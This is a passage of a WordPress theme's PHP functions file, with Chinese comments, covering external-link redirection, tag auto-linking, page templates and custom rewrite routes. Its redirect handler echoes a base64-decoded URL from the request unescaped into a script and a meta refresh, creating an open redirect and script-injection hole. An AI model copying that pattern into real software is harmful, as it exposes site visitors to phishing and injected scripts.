            foreach ($white_links as $white_link) {
                if(strpos($val, trim($white_link))!==false) {
                    $external = false;
                    break;
                }
            }
            if($external===true){
                $rep = $matches[1][0].$val.$matches[3][0];
                $new = '"'. $home . '/redirect/' . base64_encode($val). '" target="_blank"';
                $content = str_replace("$rep", "$new", $content);
            }
        }
    }
    return $content;
}
add_filter('the_content', 'tt_convert_to_internal_links', 99);
add_filter('comment_text', 'tt_convert_to_internal_links', 99);
add_filter('get_comment_text', 'tt_convert_to_internal_links', 99);
add_filter('get_comment_author_link', 'tt_convert_to_internal_links', 99);

function tt_tag_link($content)
{
    $match_num_from = 1;		//一篇文章中同一個標籤少於幾次不自動鏈接
    $match_num_to = 4;		//一篇文章中同一個標籤最多自動鏈接幾次
    $post_tags = get_the_tags();
    if (tt_get_option('tt_enable_k_post_tag_link', true) && $post_tags) {
        $sort_func = function ($a, $b) {
            if ($a->name == $b->name) {
                return 0;
            }

            return (strlen($a->name) > strlen($b->name)) ? -1 : 1;
        };
        usort($post_tags, $sort_func);
        $ex_word = '';
        $case = '';
        foreach ($post_tags as $tag) {
            $link = get_tag_link($tag->term_id);
            $keyword = $tag->name;
            $cleankeyword = stripslashes($keyword);
            $url = "<a href=\"$link\" class=\"tag-tooltip\" data-toggle=\"tooltip\" title=\"".str_replace('%s', addcslashes($cleankeyword, '$'), __('查看更多关于 %s 的文章', 'tt')).'"';
            $url .= ' target="_blank"';
            $url .= '>'.addcslashes($cleankeyword, '$').'</a>';
            $limit = rand($match_num_from, $match_num_to);
            $content = preg_replace('|(<a[^>]+>)(.*)<pre.*?>('.$ex_word.')(.*)<\/pre>(</a[^>]*>)|U'.$case, '$1$2$4$5', $content);
            $content = preg_replace('|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2$4$5', $content);
            $cleankeyword = preg_quote($cleankeyword, '\'');
            $regEx = '\'(?!((<.*?)|(<a.*?)))('.$cleankeyword.')(?!(([^<>]*?)>)|([^>]*?</a>))\'s'.$case;
            $content = preg_replace($regEx, $url, $content, $limit);
            $content = str_replace('', stripslashes($ex_word), $content);
        }
    }

    return $content;
}
add_filter('the_content', 'tt_tag_link', 12, 1);

function tt_handle_external_links_redirect() {
    $base_url = home_url('/redirect/');
    $request_url = Utils::getPHPCurrentUrl();
    if (substr($request_url, 0, strlen($base_url)) != $base_url) {
        return false;
    }
    $key = str_ireplace($base_url, '', $request_url);
    if (!empty($key)) {
        $external_url = base64_decode($key);
        header('HTTP/1.1 200 OK');
                ?>
<html lang="zh-CN">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="renderer" content="webkit">
        <meta http-equiv="Cache-Control" content="no-transform" />
        <meta http-equiv="Cache-Control" content="no-siteapp" />
        <meta name="robots" content="noindex, nofollow" />
        <meta name="applicable-device"content="pc,mobile">
        <meta name="HandheldFriendly" content="true"/>
        <meta name="description" content="跳转页面" />
        <meta name="keywords" content="跳转页面" />
        <noscript>
            <meta http-equiv="refresh" content="2;url='<?php echo $external_url; ?>';">
        </noscript>
<script>
function link_jump(){location.href="<?php echo $external_url; ?>";}
setTimeout(link_jump, 2000);
setTimeout(function(){window.opener=null;window.close();}, 50000);
</script>
<title>页面加载中,请稍候...</title>
<style type="text/css">
#loading{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999999;background:#fff;}#loading-center{width:100%;position:absolute;top:47%;left:0;right:0;margin:0 auto;text-align:center;}#loading-center .dot{display:inline-block;width:10px;height:10px;border-radius:50px;margin-right:10px;background:#a26ff9;-webkit-animation:load 1.04s ease infinite;}#loading-center .dot:last-child{margin-right:0px;}@-webkit-keyframes load{0%{opacity:1;-webkit-transform:scale(1.6);}100%{opacity:.1;-webkit-transform:scale(0);}}#loading-center .dot:nth-child(1){-webkit-animation-delay:0.1s;}#loading-center .dot:nth-child(2){-webkit-animation-delay:0.2s;}#loading-center .dot:nth-child(3){-webkit-animation-delay:0.3s;}#loading-center .dot:nth-child(4){-webkit-animation-delay:0.4s;}#loading-center .dot:nth-child(5){-webkit-animation-delay:0.5s;}</style>
</head>
<body>
<div id="loading"> <div id="loading-center"> <div class="dot"></div> <div class="dot"></div> <div class="dot"></div> <div class="dot"></div> <div class="dot"></div> </div></div>
</body>
</html><?php
        exit;
    }
    return false;
}
add_action('template_redirect', 'tt_handle_external_links_redirect');

function tt_delete_custom_meta_fields($post_ID)
{
    if (!wp_is_post_revision($post_ID)) {
        delete_post_meta($post_ID, 'tt_post_star_users');
        delete_post_meta($post_ID, 'tt_sidebar');
        delete_post_meta($post_ID, 'tt_latest_reviewed');
        delete_post_meta($post_ID, 'tt_keywords'); // page
        delete_post_meta($post_ID, 'tt_description'); // page
        delete_post_meta($post_ID, 'tt_product_price'); // product //TODO more
        delete_post_meta($post_ID, 'tt_product_quantity');
        delete_post_meta($post_ID, 'tt_pay_currency');
        delete_post_meta($post_ID, 'tt_product_sales');
        delete_post_meta($post_ID, 'tt_product_discount');
        delete_post_meta($post_ID, 'tt_buy_channel');
        delete_post_meta($post_ID, 'tt_taobao_link');
        delete_post_meta($post_ID, 'tt_latest_rated');
    }
    // TODO optimization: use sql to delete all at once
}
add_action('delete_post', 'tt_delete_custom_meta_fields');

function tt_delete_post_and_attachments($post_ID)
{
    global $wpdb;
    //删除特色图片
    $thumbnails = $wpdb->get_results("SELECT * FROM $wpdb->postmeta WHERE meta_key = '_thumbnail_id' AND post_id = $post_ID");
    foreach ($thumbnails as $thumbnail) {
        wp_delete_attachment($thumbnail->meta_value, true);
    }
    //删除图片附件
    $attachments = $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE post_parent = $post_ID AND post_type = 'attachment'");
    foreach ($attachments as $attachment) {
        wp_delete_attachment($attachment->ID, true);
    }
    $wpdb->query("DELETE FROM $wpdb->postmeta WHERE meta_key = '_thumbnail_id' AND post_id = $post_ID");
}
add_action('before_delete_post', 'tt_delete_post_and_attachments');

function tt_get_page_templates($post = null)
{
    $theme = wp_get_theme();

    if ($theme->errors() && $theme->errors()->get_error_codes() !== array('theme_parent_invalid')) {
        return array();
    }

    $page_templates = wp_cache_get('page_templates-'.md5('Tint'), 'themes');

    if (!is_array($page_templates)) {
        $page_templates = array();
        $files = (array) Utils::scandir(THEME_TPL.'/page', 'php', 0); // Note: 主要这里重新定义扫描模板的文件夹/core/templates/page
        foreach ($files as $file => $full_path) {
            if (!preg_match('|Template Name:(.*)$|mi', file_get_contents($full_path), $header)) {
                continue;
            }
            $page_templates[$file] = _cleanup_header_comment($header[1]);
        }
        wp_cache_add('page_templates-'.md5('Tint'), $page_templates, 'themes', 1800);
    }

    if ($theme->load_textdomain()) {
        foreach ($page_templates as &$page_template) {
            $page_template = translate($page_template, 'tt');
        }
    }

    $templates = (array) apply_filters('theme_page_templates', $page_templates, $theme, $post);

    return array_flip($templates);
}

function tt_page_attributes_meta_box($post)
{
    $post_type_object = get_post_type_object($post->post_type);
    if ($post_type_object->hierarchical) {
        $dropdown_args = array(
            'post_type' => $post->post_type,
            'exclude_tree' => $post->ID,
            'selected' => $post->post_parent,
            'name' => 'parent_id',
            'show_option_none' => __('(no parent)'),
            'sort_column' => 'menu_order, post_title',
            'echo' => 0,
        );

        $dropdown_args = apply_filters('page_attributes_dropdown_pages_args', $dropdown_args, $post);
        $pages = wp_dropdown_pages($dropdown_args);
        if (!empty($pages)) {
            ?>
            <p><strong><?php _e('Parent', 'tt'); ?></strong></p>
            <label class="screen-reader-text" for="parent_id"><?php _e('Parent', 'tt'); ?></label>
            <?php echo $pages; ?>
            <?php
        }
    }

    if ('page' == $post->post_type && 0 != count(tt_get_page_templates($post)) && get_option('page_for_posts') != $post->ID) {
        $template = !empty($post->page_template) ? $post->page_template : false; ?>
        <p><strong><?php _e('Template', 'tt'); ?></strong><?php
            do_action('page_attributes_meta_box_template', $template, $post); ?></p>
        <label class="screen-reader-text" for="page_template"><?php _e('Page Template', 'tt'); ?></label><select name="tt_page_template" id="page_template">
            <?php
            $default_title = apply_filters('default_page_template_title', __('Default Template', 'tt'), 'meta-box'); ?>
            <option value="default"><?php echo esc_html($default_title); ?></option>
            <?php tt_page_template_dropdown($template); ?>
        </select>
        <?php
    } ?>
    <p><strong><?php _e('Order', 'tt'); ?></strong></p>
    <p><label class="screen-reader-text" for="menu_order"><?php _e('Order', 'tt'); ?></label><input name="menu_order" type="text" size="4" id="menu_order" value="<?php echo esc_attr($post->menu_order); ?>" /></p>
    <?php if ('page' == $post->post_type && get_current_screen()->get_help_tabs()) {
        ?>
        <p><?php _e('Need help? Use the Help tab in the upper right of your screen.', 'tt'); ?></p>
        <?php
    }
}

function tt_replace_page_attributes_meta_box()
{
    remove_meta_box('pageparentdiv', 'page', 'side');
    add_meta_box('tt_pageparentdiv', __('Page Attributes', 'tt'), 'tt_page_attributes_meta_box', 'page', 'side', 'low');
}
add_action('admin_init', 'tt_replace_page_attributes_meta_box');

function tt_page_template_dropdown($default = '')
{
    $templates = tt_get_page_templates(get_post());
    ksort($templates);
    foreach (array_keys($templates) as $template) {
        $full_path = 'core/templates/page/'.$templates[$template];
        $selected = selected($default, $full_path, false);
        echo "\n\t<option value='".$full_path."' $selected>$template</option>";
    }

    return '';
}

function tt_save_meta_box_page_template_data($post_id)
{
    $post_id = intval($post_id);
    // 检查是否自动保存，自动保存则跳出
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }
    // 检查用户权限
    if (!current_user_can('edit_page', $post_id)) {
        return;
    }
    // 是否页面
    if (!isset($_POST['post_type']) || 'page' != trim($_POST['post_type'])) {
        return;
    }

    if (!empty($_POST['tt_page_template'])) {
        $template = sanitize_text_field($_POST['tt_page_template']);
        $post = get_post($post_id);
        $post->page_template = $template;
        $page_templates = array_flip(tt_get_page_templates($post));
        if ('default' != $template && !isset($page_templates[basename($template)])) {
            if (tt_get_option('tt_theme_debug', false)) {
                wp_die(__('The page template is invalid', 'tt'), __('Invalid Page Template', 'tt'));
            }
            update_post_meta($post_id, '_wp_page_template', 'default');
        } else {
            update_post_meta($post_id, '_wp_page_template', $template);
        }
    }
}
add_action('save_post', 'tt_save_meta_box_page_template_data');

function tt_modify_body_classes($classes)
{
    if ($query_var = get_query_var('site_util')) {
        $classes[] = 'site_util-'.$query_var;
    } elseif ($query_var = get_query_var('me')) {
        $classes[] = 'me-'.$query_var;
    } elseif ($query_var = get_query_var('uctab')) {
        $classes[] = 'uc-'.$query_var;
    } elseif ($query_var = get_query_var('uc')) {
        $classes[] = 'uc-profile';
    } elseif ($query_var = get_query_var('action')) {
        $classes[] = 'action-'.$query_var;
    } elseif ($query_var = get_query_var('me_child_route')) {
        $classes[] = 'me me-'.$query_var;
    } elseif ($query_var = get_query_var('manage_child_route')) {
        $query_var = get_query_var('manage_grandchild_route') ? substr($query_var, -2) : $query_var;
        $classes[] = 'manage manage-'.$query_var;
    }

    if (is_home() && tt_get_option('tt_enable_tinection_home', false) && (!isset($_GET['mod']) || $_GET['mod'] != 'blog')) {
        $classes[] = 'cms-home';
    }

    //TODO more
    return $classes;
}
add_filter('body_class', 'tt_modify_body_classes');

function tt_add_post_review_fields($post_ID)
{
    if (!wp_is_post_revision($post_ID)) {
        update_post_meta($post_ID, 'tt_latest_reviewed', time());
    }
}
add_action('save_post', 'tt_add_post_review_fields');

function tt_delete_post_review_fields($post_ID)
{
    if (!wp_is_post_revision($post_ID)) {
        delete_post_meta($post_ID, 'tt_latest_reviewed');
    }
}
add_action('delete_post', 'tt_delete_post_review_fields');

function tt_force_permalink()
{
    if (!get_option('permalink_structure')) {
        update_option('permalink_structure', '/%postname%.html');
        // TODO: 添加后台消息提示已更改默认固定链接，并请配置伪静态(伪静态教程等)
    }
}
add_action('load-themes.php', 'tt_force_permalink');

function tt_handle_post_page_routes_rewrite($wp_rewrite){
    if(get_option('permalink_structure')){
        $rules = $wp_rewrite->rules;
        foreach ($rules as $rule => $rewrite) {
            if ( $rule == '([0-9]+).html(/[0-9]+)?/?$' || $rule == '([^/]+).html(/[0-9]+)?/?$' ) {
                unset($rules[$rule]);
            }
        }
        // Note: me子路由与孙路由必须字母组成，不区分大小写
        $new_rules['(.*?)/([0-9]+)?_([0-9]+)?.html$'] = 'index.php?post_type=post&p=$matches[2]&page=$matches[3]';
        $new_rules['([0-9]+)?_([0-9]+)?.html$'] = 'index.php?post_type=post&p=$matches[1]&page=$matches[2]';
        $new_rules['(.*?)/([^/]+)_([0-9]+)?.html$'] = 'index.php?name=$matches[2]&page=$matches[3]';
        $new_rules['([^/]+)_([0-9]+)?.html$'] = 'index.php?name=$matches[1]&page=$matches[2]';
        
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
    return $wp_rewrite;
}
add_filter('generate_rewrite_rules', 'tt_handle_post_page_routes_rewrite');

function cancel_redirect_for_paged_posts($redirect_url){
        global $wp_query;
        if( is_single() && $wp_query->get( 'page' ) > 1 ){
            return false;
        }
        return $redirect_url;
    }
add_filter( 'redirect_canonical', 'cancel_redirect_for_paged_posts', 10, 2 );

function tt_rewrite_short_link()
{
    // 短链接前缀, 如https://webapproach.net/go/xxx中的go，为了便于识别短链接
    $prefix = tt_get_option('tt_short_link_prefix', 'go');
    //$url = Utils::getCurrentUrl(); //该方法需要利用wp的query
    $url = Utils::getPHPCurrentUrl();
    preg_match('/\/'.$prefix.'\/([0-9A-Za-z]*)/i', $url, $matches);
    if (!$matches) {
        return false;
    }
    $token = strtolower($matches[1]);
    $target_url = '';
    $records = tt_get_option('tt_short_link_records');
    $records = explode(PHP_EOL, $records);
    foreach ($records as $record) {
        $record = explode('|', $record);
        if (count($record) < 2) {
            continue;
        }
        if (strtolower(trim($record[0])) === $token) {
            $target_url = trim($record[1]);
            break;
        }
    }

    if ($target_url) {
        wp_redirect(esc_url_raw($target_url), 302);
        exit;
    }

    return false;
}
add_action('template_redirect', 'tt_rewrite_short_link');

function tt_set_user_page_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        // TODO: 用户链接前缀 `u` 是否可以自定义
        // Note: 用户名必须数字或字母组成，不区分大小写
//        if(stripos($ps, '%postname%') !== false){
//            // 默认为profile tab，但是链接不显示profile
//            $new_rules['@([一-龥a-zA-Z0-9]+)$'] = 'index.php?author_name=$matches[1]&uc=1';
//            // ucenter tabs
//            $new_rules['@([一-龥a-zA-Z0-9]+)/([A-Za-z]+)$'] = 'index.php?author_name=$matches[1]&uctab=$matches[2]&uc=1';
//            // 分页
//            $new_rules['@([一-龥a-zA-Z0-9]+)/([A-Za-z]+)/page/([0-9]{1,})$'] = 'index.php?author_name=$matches[1]&uctab=$matches[2]&uc=1&paged=$matches[3]';
//        }else{
        $new_rules['u/([0-9]{1,})$'] = 'index.php?author=$matches[1]&uc=1';
        $new_rules['u/([0-9]{1,})/([A-Za-z]+)$'] = 'index.php?author=$matches[1]&uctab=$matches[2]&uc=1';
        $new_rules['u/([0-9]{1,})/([A-Za-z]+)/page/([0-9]{1,})$'] = 'index.php?author=$matches[1]&uctab=$matches[2]&uc=1&tt_paged=$matches[3]';
//        }
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
}
add_action('generate_rewrite_rules', 'tt_set_user_page_rewrite_rules'); // filter `rewrite_rules_array` 也可用.

function tt_add_user_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'uc'; // 添加参数白名单uc，代表是用户中心页，采用用户模板而非作者模板
        $public_query_vars[] = 'uctab'; // 添加参数白名单uc，代表是用户中心页，采用用户模板而非作者模板
        $public_query_vars[] = 'tt_paged';
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_user_page_query_vars');

function tt_custom_author_link($link, $author_id)
{
    $ps = get_option('permalink_structure');
    if (!$ps) {
        return $link;
    }
//    if(stripos($ps, '%postname%') !== false){
//        $nickname = get_user_meta($author_id, 'nickname', true);
//        // TODO: 解决nickname重复问题，用户保存资料时发出消息要求更改重复的名字，否则改为login_name，使用 `profile_update` action
//        return home_url('/@' . $nickname);
//    }
    return home_url('/u/'.strval($author_id));
}
add_filter('author_link', 'tt_custom_author_link', 10, 2);

function tt_match_author_link_field($query_vars)
{
    if (is_admin()) {
        return $query_vars;
    }
    if (array_key_exists('author_name', $query_vars)) {
        $nickname = $query_vars['author_name'];
        global $wpdb;
        $author_id = $wpdb->get_var($wpdb->prepare("SELECT user_id FROM {$wpdb->usermeta} WHERE `meta_key` = 'nickname' AND `meta_value` = %s ORDER BY user_id ASC LIMIT 1", sanitize_text_field($nickname)));
        $logged_user_id = get_current_user_id();

        // 如果是原始author链接访问，重定向至新的自定义链接 /author/nickname -> /@nickname
        if (!array_key_exists('uc', $query_vars)) {
            //wp_redirect(home_url('/@' . $nickname), 301);
            wp_redirect(get_author_posts_url($author_id), 301);
            exit;
        }

        // 对不不合法的/@nickname/xxx子路由，直接drop `author_name` 变量以引向404
        if (array_key_exists('uctab', $query_vars) && $uc_tab = $query_vars['uctab']) {
            if ($uc_tab === 'profile') {
                // @see func.Template.php - tt_get_user_template
                //wp_redirect(home_url('/@' . $nickname), 301);
                wp_redirect(get_author_posts_url($author_id), 301);
                exit;
            } elseif (!in_array($uc_tab, (array) json_decode(ALLOWED_UC_TABS)) || ($uc_tab === 'chat' && $logged_user_id == $author_id)) {
                unset($query_vars['author_name']);
                unset($query_vars['uctab']);
                unset($query_vars['uc']);
                $query_vars['error'] = '404';

                return $query_vars;
            } elseif ($uc_tab === 'chat' && !$logged_user_id) {
                // 用户未登录, 跳转至登录页面
                wp_redirect(tt_add_redirect(tt_url_for('signin'), get_author_posts_url($author_id).'/chat'), 302);
                exit;
            }
        }

        // 新链接访问时 /@nickname
        if ($author_id) {
            $query_vars['author'] = $author_id;
            unset($query_vars['author_name']);
        }
        // 找不对匹配nickname的用户id则将nickname当作display_name解析 // TODO: 是否需要按此解析，可能导致不可预见的错误
        return $query_vars;
    } elseif (array_key_exists('author', $query_vars)) {
        $logged_user_id = get_current_user_id();
        $author_id = $query_vars['author'];
        // 如果是原始author链接访问，重定向至新的自定义链接 /author/nickname -> /u/57
        if (!array_key_exists('uc', $query_vars)) {
            wp_redirect(get_author_posts_url($author_id), 301);
            exit;
        }

        // 对不不合法的/u/57/xxx子路由，引向404
        if (array_key_exists('uctab', $query_vars) && $uc_tab = $query_vars['uctab']) {
            if ($uc_tab === 'profile') {
                wp_redirect(get_author_posts_url($author_id), 301);
                exit;
            } elseif (!in_array($uc_tab, (array) json_decode(ALLOWED_UC_TABS)) || ($uc_tab === 'chat' && $logged_user_id == $author_id)) {
                unset($query_vars['author_name']);
                unset($query_vars['author']);
                unset($query_vars['uctab']);
                unset($query_vars['uc']);
                $query_vars['error'] = '404';

                return $query_vars;
            } elseif ($uc_tab === 'chat' && !$logged_user_id) {
                // 用户未登录, 跳转至登录页面
                wp_redirect(tt_add_redirect(tt_url_for('signin'), get_author_posts_url($author_id).'/chat'), 302);
                exit;
            }
        }

        return $query_vars;
    }

    return $query_vars;
}
add_filter('request', 'tt_match_author_link_field', 10, 1);

function tt_redirect_me_main_route()
{
    if (preg_match('/^\/me$/i', $_SERVER['REQUEST_URI'])) {
        if ($user_id = get_current_user_id()) {
            //$nickname = get_user_meta(get_current_user_id(), 'nickname', true);
            wp_redirect(get_author_posts_url($user_id), 302);
        } else {
            wp_redirect(tt_signin_url(tt_get_current_url()), 302);
        }
        exit;
    }
}
add_action('init', 'tt_redirect_me_main_route'); //the `init` hook is typically used by plugins to initialize. The current user is already authenticated by this time.

function tt_handle_me_child_routes_rewrite($wp_rewrite)
{
    if (get_option('permalink_structure')) {
        // Note: me子路由与孙路由必须字母组成，不区分大小写
        $new_rules['me/([a-zA-Z]+)$'] = 'index.php?me_child_route=$matches[1]&is_me_route=1';
        $new_rules['me/([a-zA-Z]+)/([a-zA-Z]+)$'] = 'index.php?me_child_route=$matches[1]&me_grandchild_route=$matches[2]&is_me_route=1';
        $new_rules['me/order/([0-9]{1,})$'] = 'index.php?me_child_route=order&me_grandchild_route=$matches[1]&is_me_route=1'; // 我的单个订单详情
        $new_rules['me/editpost/([0-9]{1,})$'] = 'index.php?me_child_route=editpost&me_grandchild_route=$matches[1]&is_me_route=1'; // 编辑文章
        // 分页
        $new_rules['me/([a-zA-Z]+)/page/([0-9]{1,})$'] = 'index.php?me_child_route=$matches[1]&is_me_route=1&paged=$matches[2]';
        $new_rules['me/([a-zA-Z]+)/([a-zA-Z]+)/page/([0-9]{1,})$'] = 'index.php?me_child_route=$matches[1]&me_grandchild_route=$matches[2]&is_me_route=1&paged=$matches[3]';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }

    return $wp_rewrite;
}
add_filter('generate_rewrite_rules', 'tt_handle_me_child_routes_rewrite');

function tt_handle_me_child_routes_template()
{
    $is_me_route = strtolower(get_query_var('is_me_route'));
    $me_child_route = strtolower(get_query_var('me_child_route'));
    $me_grandchild_route = strtolower(get_query_var('me_grandchild_route'));
    if ($is_me_route && $me_child_route) {
        global $wp_query;
        if ($wp_query->is_404()) {
            return;
        }

        //非Home
        $wp_query->is_home = false;

        //未登录的跳转到登录页
        if(!is_user_logged_in()) {
            wp_redirect(tt_add_redirect(tt_url_for('signin'), tt_get_current_url()), 302);
            exit;
        }

        $allow_routes = (array) json_decode(ALLOWED_ME_ROUTES);
        $allow_child = array_keys($allow_routes);
        // 非法的子路由处理
        if (!in_array($me_child_route, $allow_child)) {
            Utils::set404();

            return;
        }
        // 对于order/8单个我的订单详情路由，孙路由必须是数字
        // 对于editpost/8路由，孙路由必须是数字
        if ($me_child_route === 'order' && (!$me_grandchild_route || !preg_match('/([0-9]{1,})/', $me_grandchild_route))) {
            Utils::set404();

            return;
        }
        if ($me_child_route === 'editpost' && (!$me_grandchild_route || !preg_match('/([0-9]{1,})/', $me_grandchild_route))) {
            Utils::set404();

            return;
        }
        if ($me_child_route !== 'order' && $me_child_route !== 'editpost') {
            $allow_grandchild = $allow_routes[$me_child_route];
            // 对于可以有孙路由的一般不允许直接子路由，必须访问孙路由，比如/me/notifications 必须跳转至/me/notifications/all
            if (empty($me_grandchild_route) && is_array($allow_grandchild)) {
                wp_redirect(home_url('/me/'.$me_child_route.'/'.$allow_grandchild[0]), 302);
                exit;
            }
            // 非法孙路由处理
            if (is_array($allow_grandchild) && !in_array($me_grandchild_route, $allow_grandchild)) {
                Utils::set404();

                return;
            }
        }
        $template = THEME_TPL.'/me/tpl.Me.'.ucfirst($me_child_route).'.php';
        load_template($template);
        exit;
    }
}
add_action('template_redirect', 'tt_handle_me_child_routes_template', 5);

function tt_add_me_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'is_me_route';
        $public_query_vars[] = 'me_child_route';
        $public_query_vars[] = 'me_grandchild_route';
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_me_page_query_vars');

function tt_handle_action_page_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        //action (signin|signup|signout|refresh)
        // m->move(action)
        $new_rules['m/([A-Za-z_-]+)$'] = 'index.php?action=$matches[1]';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
}
add_action('generate_rewrite_rules', 'tt_handle_action_page_rewrite_rules');

function tt_add_action_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'action'; // 添加参数白名单action，代表是各种动作页
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_action_page_query_vars');

function tt_handle_action_page_template()
{
    $action = strtolower(get_query_var('action'));
    $allowed_actions = (array) json_decode(ALLOWED_M_ACTIONS);
    if ($action && in_array($action, array_keys($allowed_actions))) {
        global $wp_query;
        $wp_query->is_home = false;
        $wp_query->is_page = true; //将该模板改为页面属性，而非首页
        $template = THEME_TPL.'/actions/tpl.M.'.ucfirst($allowed_actions[$action]).'.php';
        load_template($template);
        exit;
    } elseif ($action && !in_array($action, array_keys($allowed_actions))) {
        // 非法路由处理
        Utils::set404();

        return;
    }
}
add_action('template_redirect', 'tt_handle_action_page_template', 5);

function tt_handle_oauth_page_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        //oauth (qq|weibo|weixin|...)
        $new_rules['oauth/([A-Za-z]+)$'] = 'index.php?oauth=$matches[1]';
        $new_rules['oauth/([A-Za-z]+)/last$'] = 'index.php?oauth=$matches[1]&oauth_last=1';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
}
add_action('generate_rewrite_rules', 'tt_handle_oauth_page_rewrite_rules');

function tt_add_oauth_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'oauth'; // 添加参数白名单oauth，代表是各种OAuth登录处理页
        $public_query_vars[] = 'oauth_last'; // OAuth登录最后一步，整合WP账户，自定义用户名
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_oauth_page_query_vars');

function tt_handle_oauth_page_template()
{
    $oauth = strtolower(get_query_var('oauth'));
    $oauth_last = get_query_var('oauth_last');
    if ($oauth) {
        if (in_array($oauth, (array) json_decode(ALLOWED_OAUTH_TYPES))):
            global $wp_query;
        $wp_query->is_home = false;
        $wp_query->is_page = true; //将该模板改为页面属性，而非首页
        $template = $oauth_last ? THEME_TPL.'/oauth/tpl.OAuth.Last.php' : THEME_TPL.'/oauth/tpl.OAuth.php';
        load_template($template);
        exit; else:
            // 非法路由处理
            Utils::set404();

        return;
        endif;
    }
}
add_action('template_redirect', 'tt_handle_oauth_page_template', 5);

function tt_handle_site_util_page_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        //site_util (upgradeBrowser)
        $new_rules['site/([A-Za-z_-]+)$'] = 'index.php?site_util=$matches[1]';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
}
add_action('generate_rewrite_rules', 'tt_handle_site_util_page_rewrite_rules');

function tt_add_site_util_page_query_vars($public_query_vars)
{
    if (!is_admin()) {
        $public_query_vars[] = 'site_util'; // site_util，代表是网站级别的工具页面
    }

    return $public_query_vars;
}
add_filter('query_vars', 'tt_add_site_util_page_query_vars');

function tt_handle_site_util_page_template()
{
    $util = get_query_var('site_util');
    $allowed_utils = (array) json_decode(ALLOWED_SITE_UTILS);
    if ($util && in_array(strtolower($util), array_keys($allowed_utils))) {
        global $wp_query;

//        if($wp_query->is_404()) {
//            return;
//        }

        $wp_query->is_home = false;
        $wp_query->is_page = true; //将该模板改为页面属性，而非首页
        $template = THEME_TPL.'/site/tpl.'.ucfirst($allowed_utils[$util]).'.php';
        load_template($template);
        exit;
    } elseif ($util) {
        // 非法路由处理
        Utils::set404();

        return;
    }
}
add_action('template_redirect', 'tt_handle_site_util_page_template', 5);

function tt_handle_static_file_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        $explode_path = explode('/themes/', THEME_DIR);
        $theme_name = next($explode_path);
        //static files route
        $new_rules = array(
            'static/(.*)' => 'wp-content/themes/'.$theme_name.'/assets/$1',
        );
        $wp_rewrite->non_wp_rules = $new_rules + $wp_rewrite->non_wp_rules;
    }
}

function tt_handle_api_rewrite_rules($wp_rewrite)
{
    if ($ps = get_option('permalink_structure')) {
        $new_rules = array();
        $new_rules['^api/?$'] = 'index.php?rest_route=/';
        $new_rules['^api/(.*)?'] = 'index.php?rest_route=/$matches[1]';
        $wp_rewrite->rules = $new_rules + $wp_rewrite->rules;
    }
}

function tt_redirect_management_main_route(){
    if(preg_match('/^\/management([^\/]*)$/i', $_SERVER['REQUEST_URI'])){
        if(current_user_can('administrator')){
            //$nickname = get_user_meta(get_current_user_id(), 'nickname', true);
            wp_redirect(tt_url_for('manage_status'), 302);
        }elseif(!is_user_logged_in()) {
            wp_redirect(tt_add_redirect(tt_url_for('signin'), tt_get_current_url()), 302);
            exit;
        }elseif(!current_user_can('edit_users')) {
            wp_die(__('你没有权限访问该页面', 'tt'), __('错误: 没有权限', 'tt'), 403);
        }else{
            Utils::set404();
            return;
        }
        exit;
    }
    if(preg_match('/^\/management\/orders$/i', $_SERVER['REQUEST_URI'])){
        if(current_user_can('administrator')){
            wp_redirect(tt_url_for('manage_orders'), 302); // /management/orders -> management/orders/all
        }elseif(!is_user_logged_in()) {
            wp_redirect(tt_add_redirect(tt_url_for('signin'), tt_get_current_url()), 302);
            exit;
        }elseif(!current_user_can('edit_users')) {
            wp_die(__('你没有权限访问该页面', 'tt'), __('错误: 没有权限', 'tt'), 403);
        }else{
            Utils::set404();
            return;
        }
        exit;
    }
}
add_action('init', 'tt_redirect_management_main_route'); //the `init` hook is typically used by plugins to initialize. The current user is already authenticated by this time.

function tt_handle_management_child_routes_rewrite($wp_rewrite)
{
    if (get_option('permalink_structure')) {
        // Note: management子路由与孙路由必须字母组成，不区分大小写
        $new_rules['management/([a-zA-Z]+)$'] = 'index.php?manage_child_route=$matches[1]&is_manage_route=1';
        //$new_rules['management/([a-zA-Z]+)/([a-zA-Z]+)$'] = 'index.php?manage_child_route=$matches[1]&manage_grandchild_route=$matches[2]&is_manage_route=1';
        $new_rules['management/orders/([a-zA-Z0-9_]+)$'] = 'index.php?manage_child_route=orders&manage_grandchild_route=$matches[1]&is_manage_route=1';
        $new_rules['management/users/([a-zA-Z0-9]+)$'] = 'index.php?manage_child_route=users&manage_grandchild_route=$matches[1]&is_manage_route=1';
        // 分页
        $new_rules['management/([a-zA-Z]+)/page/([0-9]{1,})$'] = 'index.php?manage_child_route=$matches[1]&is_manage_route=1&paged=$matches[2]';
